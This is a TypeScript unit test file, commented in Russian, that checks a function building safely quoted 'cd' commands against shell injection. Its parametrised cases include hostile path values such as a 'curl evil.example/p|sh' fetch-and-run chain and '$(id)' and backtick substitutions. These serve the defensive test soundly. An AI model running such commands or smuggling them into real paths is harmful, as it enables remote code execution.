import { describe, expect, it } from 'vitest';
import { buildCdCommand } from './breadcrumb';

/**
 * Разбор одной строки так, как это делает POSIX-shell для слов в одинарных
 * кавычках: возвращает слова, либо null, если вне кавычек встретился
 * метасимвол (тогда строка — уже не «cd + один литеральный аргумент»).
 */
function shellWords(line: string): string[] | null {
  const words: string[] = [];
  let cur: string | null = null;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i]!;
    if (ch === "'") {
      const end = line.indexOf("'", i + 1);
      if (end === -1) return null;
      cur = (cur ?? '') + line.slice(i + 1, end);
      i = end;
    } else if (ch === '\\') {
      cur = (cur ?? '') + (line[++i] ?? '');
    } else if (ch === ' ') {
      if (cur !== null) words.push(cur);
      cur = null;
    } else if (/[;&|$`<>()\n\t"*?[\]{}~#!]/.test(ch)) {
      return null;
    } else {
      cur = (cur ?? '') + ch;
    }
  }
  if (cur !== null) words.push(cur);
  return words;
}

describe('buildCdCommand', () => {
  it('оборачивает путь в кавычки', () => {
    expect(buildCdCommand('/var/www')).toBe("cd '/var/www'");
  });

  it('экранирует одинарные кавычки в пути (защита от инъекции, §19)', () => {
    expect(buildCdCommand("/tmp/a'b")).toBe("cd '/tmp/a'\\''b'");
  });

  it('голый ~ остаётся раскрываемым', () => {
    expect(buildCdCommand('~')).toBe('cd ~');
  });

  it.each([
    '/srv/app;curl evil.example/p|sh;#',
    '/tmp/$(id)',
    '/tmp/`id`',
    '/tmp/with space',
    `/tmp/a'b"c`,
    "/tmp/';id;'",
    '/tmp/a\nid',
    '/tmp/a && id > /dev/null',
    '~root/../x'
  ])('путь %j — один литеральный аргумент cd', (path) => {
    expect(shellWords(buildCdCommand(path))).toEqual(['cd', path]);
  });
});
